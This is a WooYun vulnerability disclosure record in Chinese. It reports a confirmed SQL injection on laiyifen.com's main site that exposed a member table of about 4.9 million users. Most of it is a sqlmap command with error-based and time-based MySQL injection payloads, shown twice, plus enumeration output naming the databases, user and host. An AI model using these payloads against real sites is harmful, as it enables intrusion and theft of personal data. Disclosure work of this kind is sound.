{"id": 86604, "wybug_id": "wooyun-2016-0182528", "wybug_title": "来伊份主站报错SQL注入（涉及491万用户数据包括\\身份证\\电话\\地址）", "wybug_corp": "laiyifen.com", "wybug_author": "sauce", "wybug_date": "2016-03-09 14:01", "wybug_open_date": "2016-04-24 11:39", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-03-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-03-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-04-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-04-24：\t细节向公众公开  简要描述： rt  看见昨天有个来伊份注入上了走了大厂商 我也挖一个 就在主站  求首页 详细说明：  \npython sqlmap.py -u \"http://www.laiyifen.com/index.php/article*-zhifufangshi*_huodaofukuan*-lists*-11**.html\" --dbs\n\nParameter: #5* (URI)    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: http://www.laiyifen.com:80/index.php/article-zhifufangshi_huodaofukuan-lists-11\" AND (SELECT 3099 FROM(SELECT COUNT(*),CONCAT(0x7178767071,(SELECT (ELT(3099=3099,1))),0x71706b6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND \"KCUu\"=\"KCUu.html    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind    Payload: http://www.laiyifen.com:80/index.php/article-zhifufangshi_huodaofukuan-lists-11\" AND SLEEP(5) AND \"vpCf\"=\"vpCf.html---[13:01:06] [INFO] the back-end DBMS is MySQLweb application technology: Nginx, PHP 5.3.6back-end DBMS: MySQL 5.0[13:01:06] [INFO] fetching database names[13:01:07] [INFO] the SQL query used returns 3 entries[13:01:08] [INFO] retrieved: information_schema[13:01:09] [INFO] retrieved: laiyifendb[13:01:09] [INFO] retrieved: testavailable databases [3]:[*] information_schema[*] laiyifendb[*] test\n\n[13:04:12] [INFO] the back-end DBMS is MySQL[13:04:12] [INFO] fetching banner[13:04:12] [INFO] resumed: 5.1.59 - ShopEX-MySQL-logweb application technology: Nginx, PHP 5.3.6back-end DBMS: MySQL 5.0banner:    '5.1.59 - ShopEX-MySQL-log'[13:04:12] [INFO] fetching current user[13:04:12] [INFO] resumed: laiyifendb@10.%.%.%current user:    'laiyifendb@10.%.%.%'[13:04:12] [INFO] fetching current database[13:04:12] [INFO] resumed: laiyifendbcurrent database:    'laiyifendb'[13:04:12] [INFO] fetching server hostname[13:04:12] [INFO] resumed: db1hostname:    'db1'[13:04:12] [INFO] testing if current user is DBA[13:04:12] [INFO] fetching current usercurrent user is DBA:    False[13:04:13] [INFO] fetching database users[13:04:13] [INFO] the SQL query used returns 1 entries[13:04:13] [INFO] resumed: 'laiyifendb'@'10.%.%.%'database management system users [1]:[*] 'laiyifendb'@'10.%.%.%'[20:17:05] [INFO] fetching entries for table 'sdb_b2c_members' in database 'laiyifendb' [20:17:08] [INFO] the SQL query used returns 4912874 entries\n   漏洞证明：  \npython sqlmap.py -u \"http://www.laiyifen.com/index.php/article*-zhifufangshi*_huodaofukuan*-lists*-11**.html\" --dbs\n\nParameter: #5* (URI)    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: http://www.laiyifen.com:80/index.php/article-zhifufangshi_huodaofukuan-lists-11\" AND (SELECT 3099 FROM(SELECT COUNT(*),CONCAT(0x7178767071,(SELECT (ELT(3099=3099,1))),0x71706b6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND \"KCUu\"=\"KCUu.html    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind    Payload: http://www.laiyifen.com:80/index.php/article-zhifufangshi_huodaofukuan-lists-11\" AND SLEEP(5) AND \"vpCf\"=\"vpCf.html---[13:01:06] [INFO] the back-end DBMS is MySQLweb application technology: Nginx, PHP 5.3.6back-end DBMS: MySQL 5.0[13:01:06] [INFO] fetching database names[13:01:07] [INFO] the SQL query used returns 3 entries[13:01:08] [INFO] retrieved: information_schema[13:01:09] [INFO] retrieved: laiyifendb[13:01:09] [INFO] retrieved: testavailable databases [3]:[*] information_schema[*] laiyifendb[*] test\n\n[13:04:12] [INFO] the back-end DBMS is MySQL[13:04:12] [INFO] fetching banner[13:04:12] [INFO] resumed: 5.1.59 - ShopEX-MySQL-logweb application technology: Nginx, PHP 5.3.6back-end DBMS: MySQL 5.0banner:    '5.1.59 - ShopEX-MySQL-log'[13:04:12] [INFO] fetching current user[13:04:12] [INFO] resumed: laiyifendb@10.%.%.%current user:    'laiyifendb@10.%.%.%'[13:04:12] [INFO] fetching current database[13:04:12] [INFO] resumed: laiyifendbcurrent database:    'laiyifendb'[13:04:12] [INFO] fetching server hostname[13:04:12] [INFO] resumed: db1hostname:    'db1'[13:04:12] [INFO] testing if current user is DBA[13:04:12] [INFO] fetching current usercurrent user is DBA:    False[13:04:13] [INFO] fetching database users[13:04:13] [INFO] the SQL query used returns 1 entries[13:04:13] [INFO] resumed: 'laiyifendb'@'10.%.%.%'database management system users [1]:[*] 'laiyifendb'@'10.%.%.%'[20:17:05] [INFO] fetching entries for table 'sdb_b2c_members' in database 'laiyifendb' [20:17:08] [INFO] the SQL query used returns 4912874 entries\n   修复方案：  过滤    版权声明：转载请注明来源 sauce@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2016-03-10 11:39 厂商回复： 非常感谢您的支持，我们一同努力做好！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-03-09 14:23 |    \t\tsauce \t\t\t( 普通白帽子  |\t\t\t        Rank:214 漏洞数:35        | test)\t\t \n  。。走个大厂商怎么那么难  昨天的注入都走了大厂商 我这个主站的注入只走小厂商    \n     2016-03-10 11:55 |    \t\tsauce \t\t\t( 普通白帽子  |\t\t\t        Rank:214 漏洞数:35        | test)\t\t \n  来一份吧  送点吃的多好    \n     2016-03-10 13:05 |    \t\t方大核桃 \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:19        | 山东某高校学生 | 神气扫描器打造中 https:...)\t\t \n  来一份主站报错SQL注入    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}